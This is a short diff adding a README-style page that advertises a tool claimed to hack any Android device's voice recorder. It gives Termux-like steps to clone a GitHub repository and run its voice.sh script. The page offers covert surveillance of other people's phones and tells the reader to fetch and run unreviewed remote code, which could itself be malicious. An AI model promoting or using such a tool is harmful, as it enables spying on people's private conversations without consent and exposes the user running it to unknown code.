@@ -1,0 +1,18 @@
+With the help of this Tool we can H@©k any android device Voice ®ecorder.
+Installation:
+
+$ apt update && upgrade
+
+$ apt install python
+
+$ apt install git
+
+$ git clone git://github.com/Noob-Junk/voice.git
+
+$ ls
+
+$ cd voice
+
+$ ls
+
+$ bash voice.sh
